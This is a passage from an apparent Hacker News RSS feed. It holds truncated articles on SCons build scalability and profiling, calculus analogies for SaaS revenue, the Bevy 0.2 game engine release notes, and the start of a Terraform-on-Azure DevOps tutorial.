Here‚Äôs another version of that graph, this time augmented with a couple additional lines that show what the plot would look like if SCons were truly scaling linearly.  The first projection is based on the original graph from 2,500 to 4,500 targets ‚Äî that is, if we assume that SCons scales linearly and that the increase in build time between 2,500 and 4,500 targets is representative of the cost to add 2,000 more targets, then this line shows us how we should expect the build time to increase.  Similarly, the second projection is based on the original graph between 4,500 and 8,500 targets.  You can easily see that the actual data does not match either projection.  Furthermore you can see that the slope of these projections is <i>increasing</i>:</p>
<p>
<a href="https://emelski.files.wordpress.com/2013/12/scons_baechle_augmented.png"><img data-attachment-id="1039" data-permalink="https://blog.melski.net/2013/12/11/update-scons-is-still-really-slow/scons_baechle_augmented/#main" data-orig-file="https://emelski.files.wordpress.com/2013/12/scons_baechle_augmented.png" data-orig-size="500,500" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="SCons full build runtime with linear projections, via D. Baechle" data-image-description="" data-medium-file="https://emelski.files.wordpress.com/2013/12/scons_baechle_augmented.png?w=300" data-large-file="https://emelski.files.wordpress.com/2013/12/scons_baechle_augmented.png?w=500" src="https://emelski.files.wordpress.com/2013/12/scons_baechle_augmented.png?w=640&amp;h=640" alt="SCons full build runtime with linear projections, via D. Baechle - click for full size" srcset="https://emelski.files.wordpress.com/2013/12/scons_baechle_augmented.png 500w, https://emelski.files.wordpress.com/2013/12/scons_baechle_augmented.png?w=150&amp;h=150 150w, https://emelski.files.wordpress.com/2013/12/scons_baechle_augmented.png?w=300&amp;h=300 300w" sizes="(max-width: 500px) 100vw, 500px"></a></p>
<p>
This shows the importance of testing at large scale when you‚Äôre trying to characterize the scalability of a system from empirical data.  It can be difficult to differentiate polynomial from logarithmic or linear at low scales, especially once you incorporate the constant factors ‚Äî polynomial algorithms can sometimes even give <i>better</i> absolute performance for small inputs than linear algorithms!  It‚Äôs not until you plot enough data points at large enough values, as I‚Äôve done, that it becomes easy to see and identify the curve.</p>
<h3>What does profiling tell us?</h3>
<p>
Next, Dirk reran some of his tests under a profiler, on the very reasonable assumption that if there was a performance problem to be found, it would manifest in the profiling data ‚Äî surely at least one function would demonstrate a larger-than-expected growth in runtime.  Dirk only shared profiling data for two runs, both incremental builds, at 8,500 and 16,500 targets.  That‚Äôs unfortunate for a couple reasons.  First, the performance problem is less apparent on incremental builds than on full builds.  Second, with only two datapoints it is literally not possible to determine whether growth is linear or polynomial.  The results of Dirk‚Äôs profiling was negative:  he found no ‚Äúsignificant difference or increase‚Äù in any function.</p>
<p>
Fortunately it‚Äôs easy to run this experiment myself.  Dirk used <a href="http://docs.python.org/2/library/profile.html">cProfile</a>, which is built-in to Python.  To profile a Python script you can inject cProfile from the command-line, like this: <span><span face="Courier New">python -m cProfile scons</span></span>.  Just before Python exits, cProfile dumps timing data for every function invoked during the run.  I ran several full builds with the profiler enabled, from 2,000 to 20,000 targets.  Then I sorted the profiling data by function internal time (time spent in the function exclusively, not in its descendents).  <i>In every run</i>, the same two functions appeared at the top of the list:  <span><span face="Courier New">posix.waitpid</span></span> and <span><span face="Courier New">posix.fork</span></span>.  To be honest this was a surprise to me ‚Äî previously I believed the problem was in SCons‚Äô Taskmaster implementation.  But I can‚Äôt really argue with the data.  It makes sense that SCons would spend most of its time running and waiting for child processes to execute, and even that the amount of time spent in these functions would increase as the number of child processes increases.  But look at the growth in runtimes in these two functions:</p>
<p>
<a href="https://emelski.files.wordpress.com/2013/12/scons_profiler.png"><img data-attachment-id="1041" data-permalink="https://blog.melski.net/2013/12/11/update-scons-is-still-really-slow/scons_profiler/#main" data-orig-file="https://emelski.files.wordpress.com/2013/12/scons_profiler.png" data-orig-size="500,500" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="SCons full build function time, top two functions" data-image-description="" data-medium-file="https://emelski.files.wordpress.com/2013/12/scons_profiler.png?w=300" data-large-file="https://emelski.files.wordpress.com/2013/12/scons_profiler.png?w=500" src="https://emelski.files.wordpress.com/2013/12/scons_profiler.png?w=640&amp;h=640" alt="SCons full build function time, top two functions - click for full size" srcset="https://emelski.files.wordpress.com/2013/12/scons_profiler.png 500w, https://emelski.files.wordpress.com/2013/12/scons_profiler.png?w=150&amp;h=150 150w, https://emelski.files.wordpress.com/2013/12/scons_profiler.png?w=300&amp;h=300 300w" sizes="(max-width: 500px) 100vw, 500px"></a></p>
<p>
Like the overall build time, these curves are obviously non-linear.  Armed with this knowledge, I went back to Dirk‚Äôs profiling data.  To my surprise, <i>posix.waitpid and posix.fork don‚Äôt even appear in Dirk‚Äôs data</i>.  On closer inspection, his data seems to include only a subset of all functions ‚Äî about 600 functions, whereas <a href="https://github.com/emelski/scons_bench/blob/master/logs/2.3.0_profiling/001/20000.prof">my profiling data</a> contains more than 1,500.  I cannot explain this ‚Äî perhaps Dirk filtered the results to exclude functions that are part of the Python library, assuming that the problem must be in SCons‚Äô own code rather than in the library on which it is built.</p>
<p>
This demonstrates a second fundamental principle of performance analysis:  make sure that you consider <i>all</i> the data.  Programmers‚Äô intuition about performance problems is notoriously bad ‚Äî even mine! ‚Äî which is why it‚Äôs important to measure before acting.  But measuring won‚Äôt help if you‚Äôre missing critical data or if you discard part of the data before doing any analysis.</p>
<h3>Conclusions</h3>
<p>
On the surface, performance analysis seems like it should be simple:  start a timer, run some code, stop the timer.  Done correctly, performance analysis can illuminate the dark corners of your application‚Äôs performance.  Done incorrectly ‚Äî and there are <i>many</i> ways to do it incorrectly ‚Äî it can lead you on a wild goose chase and cause you to squander resources fixing the wrong problems.</p>
<p>
Dirk Baechle had good intentions when he set out to analyze SCons performance, but he made some mistakes in his process that led him to an erroneous conclusion.  First, he didn‚Äôt run enough ‚Ä¶</p></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.melski.net/2013/12/11/update-scons-is-still-really-slow/">https://blog.melski.net/2013/12/11/update-scons-is-still-really-slow/</a></em></p>]]>
            </description>
            <link>https://blog.melski.net/2013/12/11/update-scons-is-still-really-slow/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24530845</guid>
            <pubDate>Sat, 19 Sep 2020 22:56:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Calculus in SaaS]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24530760">thread link</a>) | @Lukas1994
<br/>
September 19, 2020 | https://www.causal.app/blog/calculus-in-saas | <a href="https://web.archive.org/web/*/https://www.causal.app/blog/calculus-in-saas">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>Note:&nbsp;this was originally published at </em><a href="https://alexoppenheimer.substack.com/" target="_blank"><em>https://alexoppenheimer.substack.com/</em></a>‚Äç</p><p>I have been studying the SaaS model in depth for almost 7 years now. Since the day <a href="https://alexoppenheimer.substack.com/p/harry-2d5d1af6bf">Harry Weller</a> walked into my office with a stack of materials and told me to study it and then SaaS build models and bring them to portfolio companies, I don't think a day has gone by where I have not thought about the conceptual and operational nuances of the recurring revenue business model.</p><p>Somewhere around mid 2015 I had my "aha" moment in my research when I tied my academic training in mechanical engineering to the startup business models I was building: it's all calculus. The integral-derivative relationship applies incredibly well to the ARR and Recognized Revenue relationship. Making this connection between engineering math and financial math gave me a feeling that only a true nerd could appreciate: the joy of putting integral symbols and accounting terms on the same slide.</p><p>The simplest way to illustrate this mathematical parallel is with a car:</p><figure id="w-node-2abd43418357-51d2da99"><p><img src="https://uploads-ssl.webflow.com/5e8a043bfbc2c035b4d8e5b5/5f649b33c9e3271323643b3d_https%253A%252F%252Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%252Fpublic%252Fimages%252F42d5ef92-52d9-49fe-8be7-16028bee1ff4_884x306.png" alt=""></p></figure><p>If a car is moving at 60mph, then in one hour it will travel 60 miles (assuming its speed does not change). That is the definition of "miles per hour." ARR is very similar: if a company is "moving" at $10M ARR, then in one year it will recognize $10M of revenue (assuming everything stays consistent). Recognized revenue is the distance, ARR is the speed. It's critical to recognize that ARR is a rate at a specific point in time used to imply something (here, expected recognized revenue in the future period).</p><p>For the more accounting oriented, another analogy can be made to the balance sheet:</p><figure id="w-node-9fc87f218c80-51d2da99"><p><img src="https://uploads-ssl.webflow.com/5e8a043bfbc2c035b4d8e5b5/5f649b3392b0138c4e64006b_https%253A%252F%252Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%252Fpublic%252Fimages%252F6c06ddcc-de3e-4d96-960a-22b4b39e334e_842x455.png" alt=""></p></figure><p>While revenue is the top line metric on the income statement, ARR works more like a balance sheet metric: it is taken at a single point in time rather than over a period of time. This can make income statements confusing and misaligned - another example of the divergence of accounting in economics in subscription businesses.</p><p>Now back to calculus... if the ARR function was actually a mathematical equation, you could integrate it. If y = 10x where y = ARR and x = time in months, then after two months ARR = $20. After 12 months, ARR = $120 (assuming we start from $0 of ARR). So at the end of a year, the business has grown from $0 to $120 in ARR. But what is the recognized revenue? The complex answer is that it's the integral of 10x from 0 to 12 months. (Apologies in advance if this triggers a high school calculus flashback.)</p><figure><p><img src="https://uploads-ssl.webflow.com/5e8a043bfbc2c035b4d8e5b5/5f649b337d3c7911d7362b81_https%253A%252F%252Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%252Fpublic%252Fimages%252Ff7fcb57f-644b-490c-bfa8-6d0c986d2fda_305x80.png" alt=""></p></figure><p>You could also chart this out and see that it is a right triangle with the area of 1/2*base*height. Where the base is 12 months and the height is $120: $1,440/2 = $720).</p><p>Pretty cool relationship and calculation conceptually, but in real businesses ARR growth doesn't fit a simple equation (or any equation at all), so it's not inherently practical to start breaking out the power rule and your old textbooks to predict ARR growth.</p><p>If we switch back to the car analogy, it takes on a little more of a nuanced meaning. Just like a business doesn't grow on a smooth curve, car speeds do not either. Just like the gas pedal makes the car go faster and the brake pedal &amp; friction make it go slower, so too in a SaaS company, <a href="https://alexoppenheimer.substack.com/p/thin-slicing-arr">the new sales are making the speed/ARR increase and the churned customers are making the speed/ARR decrease</a>. I will dive into more details in later posts, but the goal in a car is to go as far and fast as you can while burning the least amount of fuel. So too in a SaaS company, the goal is to have the highest ARR you can, recognize the most revenue and burn the least cash. You can think about SaaS Magic Number like the fuel efficiency of a SaaS business - looking forward to diving into why this is actually helpful in building a company.</p></div></div>]]>
            </description>
            <link>https://www.causal.app/blog/calculus-in-saas</link>
            <guid isPermaLink="false">hacker-news-small-sites-24530760</guid>
            <pubDate>Sat, 19 Sep 2020 22:33:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Bevy 0.2]]>
            </title>
            <description>
<![CDATA[
Score 215 | Comments 33 (<a href="https://news.ycombinator.com/item?id=24530698">thread link</a>) | @_cart
<br/>
September 19, 2020 | https://bevyengine.org/news/bevy-0-2/ | <a href="https://web.archive.org/web/*/https://bevyengine.org/news/bevy-0-2/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p><img src="https://bevyengine.org/news/bevy-0-2/matching_squares.png"></p>
      
    
  </div><div><p>A month after the initial Bevy release, and thanks to <strong>87</strong> contributors, <strong>174</strong> pull requests, and our <a href="https://github.com/sponsors/cart"><strong>generous sponsors</strong></a>, I'm happy to announce the <strong>Bevy 0.2</strong> release on <a href="https://crates.io/crates/bevy">crates.io</a>!</p>
<p>For those who don't know, Bevy is a refreshingly simple data-driven game engine built in Rust. You can check out <a href="https://bevyengine.org/learn/book/getting-started/">Quick Start Guide</a> to get started. Bevy is also free and open source forever! You can grab the full <a href="https://github.com/bevyengine/bevy">source code</a> on GitHub.</p>
<p>Here are some of the highlights from this release:</p>
<h2 id="async-task-system">Async Task System</h2>

<p>Bevy uses multi-threading throughout the engine: ECS scheduling, asset loading, rendering, etc. Before this release it used <a href="https://github.com/rayon-rs/rayon">Rayon</a> for almost all of these tasks. Rayon is nice because it is generally as simple as calling <code>some_list.par_iter().for_each(|x| do_something(x))</code>. Rayon then automatically breaks the <code>for_each</code> into tasks and runs them on as many cores as it can. Rayon is a great choice if you want to easily parallelize code, but it has the downside of being pretty cpu-hungry.</p>
<p>Bevy (and a number of other rust game engines and ecs frameworks using rayon) have received feedback that they were overly cpu hungry / usage was not proportional to "real" work done.</p>
<p>We decided to resolve this problem by building a custom async-friendly task system, which enables the creation of context-specific task pools. For example, you might have separate pools for compute, IO, networking, etc. This also gives us the flexibility to load balance work appropriately according to work type and/or priority. The cpu usage wins have been huge:</p>
<h3 id="total-combined-percent-cpu-usage-8-core-machine-smaller-is-better">Total Combined Percent CPU Usage - 8 Core Machine (smaller is better)</h3>
<p><img src="https://bevyengine.org/news/bevy-0-2/bevy_tasks_1.svg" alt="threading cpu usage 8 core"></p>
<h3 id="total-combined-percent-cpu-usage-32-core-machine-smaller-is-better">Total Combined Percent CPU Usage - 32 Core Machine (smaller is better)</h3>
<p><img src="https://bevyengine.org/news/bevy-0-2/bevy_tasks_2.svg" alt="threading cpu usage 32 core"></p>
<h2 id="initial-web-platform-support">Initial Web Platform Support</h2>
<p>authors: @smokku</p>
<p>(A subset of) Bevy now runs on the web using WebAssembly/WASM! Specifically, Bevy apps can run Bevy ECS schedules, react to input events, create an empty canvas (using winit), and a few other things. This is a huge first step, but it is important to call out that there are still a number of missing pieces, such as 2D/3D rendering, multi-threading, and sound. </p>
<p>Those limitations haven't stopped @mrk-its from building the first WASM Bevy game!</p>
<h3 id="bevy-robbo-playable-here"><a href="https://github.com/mrk-its/bevy-robbo">bevy-robbo</a> (<a href="https://s3.eu-central-1.amazonaws.com/mrk-public/bevy-robbo/index.html">playable here</a>)</h3>
<p><img src="https://bevyengine.org/news/bevy-0-2/bevy-robbo.png" alt="bevy-robbo"></p>
<p>They use Bevy for game logic and cleverly work around the render limitations by passing ASCII art game state from <a href="https://github.com/mrk-its/bevy-robbo/blob/master/src/systems/js_render.rs">this Bevy system</a> to <a href="https://github.com/mrk-its/bevy-robbo/blob/master/assets/render.js">this JavaScript function</a>. </p>
<p>You can play around with some Bevy WASM examples by <a href="https://github.com/bevyengine/bevy/tree/master/examples#wasm">following the instructions here</a>.</p>
<h2 id="parallel-queries">Parallel Queries</h2>
<p>authors: @GrantMoyer</p>
<p>Bevy ECS Queries are a flexible way to retrieve data from the Entity Component System. Systems that <em>use</em> queries already run in parallel, but before this change the queries themselves could not be <em>iterated</em> in parallel. <strong>Bevy 0.2</strong> adds the ability to easily iterate queries in parallel:</p>
<pre><code><span>fn </span><span>system</span><span>(</span><span>pool</span><span>: </span><span>Res</span><span>&lt;</span><span>ComputeTaskPool</span><span>&gt;</span><span>, </span><span>mut </span><span>query</span><span>: </span><span>Query</span><span>&lt;&amp;</span><span>mut</span><span> Transform</span><span>&gt;) {</span><span>
    query</span><span>.</span><span>iter</span><span>().</span><span>par_iter</span><span>(</span><span>32</span><span>).</span><span>for_each</span><span>(&amp;</span><span>pool</span><span>, |</span><span>mut </span><span>transform</span><span>| {</span><span>
      transform</span><span>.</span><span>translate</span><span>(</span><span>Vec3</span><span>::</span><span>new</span><span>(</span><span>1.0</span><span>, </span><span>0.0</span><span>, </span><span>0.0</span><span>));
    });
}
</span></code></pre>
<p>This provides a nice functional api (similar to Rayon) that runs on top of the new <code>bevy_tasks</code> system. It breaks the query up into 32 "batches" and runs each batch as a different task in the bevy task system. </p>
<h2 id="transform-system-rewrite">Transform System Rewrite</h2>
<p>authors: @MarekLg</p>
<pre><code><span>// old
</span><span>fn </span><span>system</span><span>(</span><span>translation</span><span>: &amp;</span><span>Translation, </span><span>rotation</span><span>: &amp;</span><span>Rotation, </span><span>scale</span><span>: &amp;</span><span>Scale</span><span>) {
  </span><span>println!</span><span>("</span><span>{} {} {}</span><span>",</span><span> translation</span><span>.</span><span>0</span><span>,</span><span> rotation</span><span>.</span><span>0</span><span>,</span><span> scale</span><span>.</span><span>0</span><span>);
}

</span><span>// new
</span><span>fn </span><span>system</span><span>(</span><span>transform</span><span>: &amp;</span><span>Transform</span><span>) {
  </span><span>println!</span><span>("</span><span>{} {} {}</span><span>",</span><span> transform</span><span>.</span><span>translation</span><span>(),</span><span> transform</span><span>.</span><span>rotation</span><span>(),</span><span> transform</span><span>.</span><span>scale</span><span>());
}
</span></code></pre>
<p>Bevy's old transform system used separate <code>Translation</code>, <code>Rotation</code>, and <code>Scale</code> components as the "source of truth". Users modified with these components in their systems, after which they were synced to a <code>LocalTransform</code> component, which was in turn synced to a global <code>Transform</code> component, taking hierarchy into account. This was nice for a couple of reasons:</p>
<ul>
<li>Slightly more cache efficient to retrieve individual components like <code>Translation</code> (because less data needs to be accessed)</li>
<li>Theoretically more parallel-friendly. Systems that only access <code>Translation</code> won't block systems accessing <code>Rotation</code>.</li>
</ul>
<p>However this approach also has some pretty serious downsides:</p>
<ul>
<li>The "individual components" are the source of truth, so <code>LocalTransform</code> is out of date when user systems are running. If an up to date "full transform" is needed, it must be manually constructed by accessing all three components.</li>
<li>Very hard to reason about. There are 5 components users need to think about and they all interact with each other differently.</li>
<li>Setting a Transform to a specific matrix value (ex: <code>Mat4::look_at()</code>) was extremely cumbersome, and the value would be immediately overwritten unless the user explicitly disabled component syncing.</li>
</ul>
<p>Given these issues, we decided to move to a single unified local-to-parent <code>Transform</code> component as the source of truth, and a computed <code>GlobalTransform</code> component for world-space transforms. We think this api will be much easier to use and to reason about. <a href="https://gist.github.com/joeante/79d25ec3a0e86436e53eb74f3ac82c0c">Unity is also considering a similar Transform rework for their ECS</a> and a lot of discussion on this topic happened in this <a href="https://community.amethyst.rs/t/legion-transform-design-discussion">Amethyst Forum Thread</a>.</p>
<h2 id="joystick-gamepad-input">Joystick/Gamepad Input</h2>
<p>authors: @simpuid</p>
<p>The Bevy Input plugin now has cross-platform support for most controllers thanks to the <a href="https://gitlab.com/gilrs-project/gilrs">gilrs</a> library!</p>
<pre><code><span>fn </span><span>button_system</span><span>(</span><span>gamepads</span><span>: </span><span>Res</span><span>&lt;</span><span>Vec</span><span>&lt;</span><span>Gamepad</span><span>&gt;&gt;</span><span>, </span><span>button_input</span><span>: </span><span>Res</span><span>&lt;</span><span>Input</span><span>&lt;</span><span>GamepadButton</span><span>&gt;&gt;) {
    </span><span>for</span><span> gamepad </span><span>in</span><span> gamepads</span><span>.</span><span>iter</span><span>() {
        </span><span>if</span><span> button_input</span><span>.</span><span>just_pressed</span><span>(</span><span>GamepadButton</span><span>(*</span><span>gamepad</span><span>, </span><span>GamepadButtonType</span><span>::</span><span>RightTrigger</span><span>)) {
            </span><span>println!</span><span>("</span><span>Pressed right trigger!</span><span>");
        }
    }
}
</span></code></pre><h2 id="bevy-ecs-performance-improvements">Bevy ECS Performance Improvements</h2>
<p>authors: @cart</p>
<h3 id="generational-entity-ids">Generational Entity IDs</h3>
<p>We changed Entity IDs from being random UUIDs to incrementing generational indices. Random UUIDs were nice because they could be created anywhere, were unique across game runs, and could be safely persisted to files or reused across networks. I was really hoping we could make them work, but they ended up being too slow relative to the alternatives. The randomness had a measurable cost and entity locations had to be looked up using a hash map.</p>
<p>By moving to generational indices (we use the hecs implementation), we can directly use entity ids as array indices, which makes entity location lookups lightning fast.</p>
<h3 id="read-only-queries">Read Only Queries</h3>
<p>I implemented "read only" traits for queries that don't mutate anything. This allows us to guarantee that a query won't mutate anything.</p>
<h3 id="removed-locking-from-world-apis">Removed locking from World apis</h3>
<p>This gives us a really nice speed boost. We can do this safely due to a combination of the new "read only queries" and changing World mutation apis to be a mutable World borrow.</p>
<p>This is not yet enabled for <code>Queries</code> in systems because a system could have multiple <code>Queries</code>, which could be simultaneously accessed in a way that doesn't make mutable access unique. I think thats a solve-able problem, but it will take a bit more work. Fortunately "for-each" systems don't have any collision risk, so we now use lock-less queries there.</p>
<h3 id="direct-component-lookup-in-nanoseconds-smaller-is-better">Direct component lookup (in nanoseconds, smaller is better)</h3>
<p>As a result of these optimizations, direct component lookup is <em>much</em> faster than it used to be:</p>
<p><img src="https://bevyengine.org/news/bevy-0-2/get_component.svg" alt="get_component graph"></p>
<p>Note that this benchmark used <code>world.get::&lt;T&gt;(entity)</code>. <code>query.get::&lt;T&gt;(entity)</code> should have results similar to the <code>hecs</code> results because it still uses a lock. Eventually I'm hoping that we can remove locks from system queries too.</p>
<h2 id="change-log">Change Log</h2>
<h3 id="added">Added</h3>
<ul>
<li><a href="https://github.com/bevyengine/bevy/pull/384">Task System for Bevy</a>
<ul>
<li>Replaces rayon with a custom designed task system that consists of several "TaskPools".</li>
<li>Exports <code>IOTaskPool</code>, <code>ComputePool</code>, and <code>AsyncComputePool</code> in <code>bevy_tasks</code> crate.</li>
</ul>
</li>
<li><a href="https://github.com/bevyengine/bevy/pull/292">Parallel queries for distributing work over with the <code>ParallelIterator</code> trait.</a>
<ul>
<li>e.g. <code>query.iter().par_iter(batch_size).for_each(/* ... */)</code></li>
</ul>
</li>
<li><a href="https://github.com/bevyengine/bevy/pull/280">Added gamepad support using Gilrs</a></li>
<li><a href="https://github.com/bevyengine/bevy/pull/503">Implement WASM support for bevy_winit</a></li>
<li><a href="https://github.com/bevyengine/bevy/pull/506">Create winit canvas under WebAssembly</a> </li>
<li><a href="https://github.com/bevyengine/bevy/pull/496">Implement single threaded task scheduler for WebAssembly</a></li>
<li><a href="https://github.com/bevyengine/bevy/pull/271">Support for binary glTF (.glb).</a></li>
<li><a href="https://github.com/bevyengine/bevy/pull/358">Support for <code>Or</code> in ECS queries.</a></li>
<li><a href="https://github.com/bevyengine/bevy/pull/339">Added methods <code>unload()</code> and <code>unload_sync()</code> on <code>SceneSpawner</code> for unloading scenes.</a>.</li>
<li><a href="https://github.com/bevyengine/bevy/pull/145">Custom rodio source for audio.</a>
<ul>
<li><code>AudioOuput</code> is now able to play anything <code>Decodable</code>.</li>
</ul>
</li>
<li><a href="https://github.com/bevyengine/bevy/pull/362"><code>Color::hex</code></a> for creating <code>Color</code> from string hex values.
<ul>
<li>Accepts the forms RGB, RGBA, RRGGBB, and RRGGBBAA.</li>
</ul>
</li>
<li><a href="https://github.com/bevyengine/bevy/pull/381"><code>Color::rgb_u8</code> and <code>Color::rgba_u8</code>.</a></li>
<li><a href="https://github.com/bevyengine/bevy/pull/396">Added <code>bevy_render::pass::ClearColor</code> to prelude.</a></li>
<li><a href="https://github.com/bevyengine/bevy/pull/430"><code>SpriteResizeMode</code> may choose how <code>Sprite</code> resizing should be handled. <code>Automatic</code> by default.</a></li>
<li><a href="https://github.com/bevyengine/bevy/pull/428">Added methods on <code>Input&lt;T&gt;</code></a> for iterator access to keys.
<ul>
<li><code>get_pressed()</code>, <code>get_just_pressed()</code>, <code>get_just_released()</code></li>
</ul>
</li>
<li><a href="https://github.com/bevyengine/bevy/pull/270">Derived <code>Copy</code> for <code>MouseScrollUnit</code>.</a></li>
<li><a href="https://github.com/bevyengine/bevy/pull/390">Derived <code>Clone</code> for UI component bundles.</a></li>
<li><a href="https://github.com/bevyengine/bevy/pull/332">Some examples of documentation</a></li>
<li><a href="https://github.com/bevyengine/bevy/pull/451">Update docs for Updated, Changed and Mutated</a></li>
<li>Tips for faster builds on macOS: <a href="https://github.com/bevyengine/bevy/pull/312">#312</a>, <a href="https://github.com/bevyengine/bevy/pull/314">#314</a>, <a href="https://github.com/bevyengine/bevy/pull/433">#433</a></li>
<li>Added and documented cargo features
<ul>
<li><a href="https://github.com/bevyengine/bevy/pull/249">Created document <code>docs/cargo_features.md</code>.</a></li>
<li><a href="https://github.com/bevyengine/bevy/pull/249">Added features for x11 and wayland display servers.</a></li>
<li><a href="https://github.com/bevyengine/bevy/pull/363">and added a feature to disable libloading.</a> (helpful for WASM support)</li>
</ul>
</li>
<li>Added more instructions for Linux dependencies
<ul>
<li><a href="https://github.com/bevyengine/bevy/pull/275">Arch / Manjaro</a>, <a href="https://github.com/bevyengine/bevy/pull/290">NixOS</a>, <a href="https://github.com/bevyengine/bevy/pull/463">Ubuntu</a> and <a href="https://github.com/bevyengine/bevy/pull/331">Solus</a></li>
</ul>
</li>
<li><a href="https://github.com/bevyengine/bevy/pull/491">Provide shell.nix for easier compiling with nix-shell</a></li>
<li><a href="https://github.com/bevyengine/bevy/pull/505">Add <code>AppBuilder::add_startup_stage_|before/after</code></a></li>
</ul>
<h3 id="changed">Changed</h3>
<ul>
<li><a href="https://github.com/bevyengine/bevy/pull/374">Transform rewrite</a></li>
<li><a href="https://github.com/bevyengine/bevy/pull/504">Use generational entity ids and other optimizations</a></li>
<li><a href="https://github.com/bevyengine/bevy/pull/417">Optimize transform systems to only run on changes.</a></li>
<li><a href="https://github.com/bevyengine/bevy/pull/323">Send an AssetEvent when modifying using <code>get_id_mut</code></a></li>
<li><a href="https://github.com/bevyengine/bevy/pull/332">Rename <code>Assets::get_id_mut</code> -&gt; <code>Assets::get_with_id_mut</code></a></li>
<li><a href="https://github.com/bevyengine/bevy/pull/183">Support multiline text in <code>DrawableText</code></a></li>
<li><a href="https://github.com/bevyengine/bevy/pull/324">iOS: use shaderc-rs for glsl to spirv compilation</a></li>
<li><a href="https://github.com/bevyengine/bevy/pull/304">Changed the default node size to Auto instead of Undefined to match the Stretch implementation.</a></li>
<li><a href="https://github.com/bevyengine/bevy/pull/478">Load assets from root path when loading directly</a></li>
<li><a href="https://github.com/bevyengine/bevy/pull/485">Add <code>render</code> feature</a>, which makes the entire render pipeline optional.</li>
</ul>
<h3 id="fixed">Fixed</h3>
<ul>
<li><a href="https://github.com/bevyengine/bevy/pull/361">Properly track added and removed RenderResources in RenderResourcesNode.</a>
<ul>
<li>Fixes issues where entities vanished or changed color when new entities were spawned/despawned.</li>
</ul>
</li>
<li><a href="https://github.com/bevyengine/bevy/pull/385">Fixed sprite clipping at same depth</a>
<ul>
<li>Transparent sprites should no longer clip.</li>
</ul>
</li>
<li><a href="https://github.com/bevyengine/bevy/pull/345">Check asset path existence</a></li>
<li><a href="https://github.com/bevyengine/bevy/pull/376">Fixed deadlock in hot asset reloading</a></li>
<li><a href="https://github.com/bevyengine/bevy/pull/394">Fixed hot asset reloading on Windows</a></li>
<li><a href="https://github.com/bevyengine/bevy/pull/406">Allow glTFs to be loaded that don't have uvs and normals</a></li>
<li><a href="https://github.com/bevyengine/bevy/pull/383">Fixed archetypes_generation being ‚Ä¶</a></li></ul></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://bevyengine.org/news/bevy-0-2/">https://bevyengine.org/news/bevy-0-2/</a></em></p>]]>
            </description>
            <link>https://bevyengine.org/news/bevy-0-2/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24530698</guid>
            <pubDate>Sat, 19 Sep 2020 22:21:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Provisioning an App Service on Azure Using Terraform with AzureDevOps]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24530366">thread link</a>) | @lokethien
<br/>
September 19, 2020 | https://www.andreasrein.net/posts/app-service-terraform-azure-azuredevops/ | <a href="https://web.archive.org/web/*/https://www.andreasrein.net/posts/app-service-terraform-azure-azuredevops/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<article>
  
  <div><p>Part of a good DevOps routine is to have the infrastructure as code. This way you can utilize a high level of control with source control. You can also effortlessly spin up another identical environment.</p>

<h2 id="terraform">Terraform</h2>

<p>If you have a sizable project that has a lot of resources or a DevOps enthusiast, it may be smart to keep it in source control.</p>

<p>Terraform is Hashicorp‚Äôs solution for <em>IaC</em>. The configuration language of choice is HcL (Hashicorp configuration language). Please do not fear learning a new language. HcL is highly enjoyable and simple to learn. It‚Äôs also multi-cloud so you can learn Terraform once and use it to provision resources on AWS, Azure, and Google Cloud.</p>

<p>The Azure provider is relatively mature and it‚Äôs in constant development. It‚Äôs open-source so if you are having issues, you can always create an issue on their repository. If you absolutely cannot do what you want to do using Terraform, you could always use ARM templates in Terraform or even CLI commands. So let‚Äôs go through the tutorial of using it in Azure with CI/CD using Azure DevOps.</p>

<h2 id="recipe">Recipe</h2>

<h3 id="1-install-terraform-extension">1. Install Terraform extension</h3>

<p>In this tutorial, I will use an extension to AzureDevOps that will enable us to run Terraform in our build pipeline. Get it <a href="https://marketplace.visualstudio.com/items?itemName=ms-devlabs.custom-terraform-tasks">here</a> and install it in your organization.</p>

<h3 id="2-create-project-on-azuredevops">2. Create project on AzureDevOps</h3>

<p>Before you start creating a pipeline, you should have a project ready on AzureDevOps. Remember that the service <code>Pipelines</code> needs to be on (can be turned on in settings -&gt; overview) and <code>Repos</code> as well.</p>

<p>After that, you should create a repository and clone it to your desktop. Since the pipeline will include two stages; develop and master, it is smart to create a branch <code>develop</code> out from <code>master</code>.</p>

<h3 id="3-set-up-a-service-connection">3. Set-up a service connection</h3>

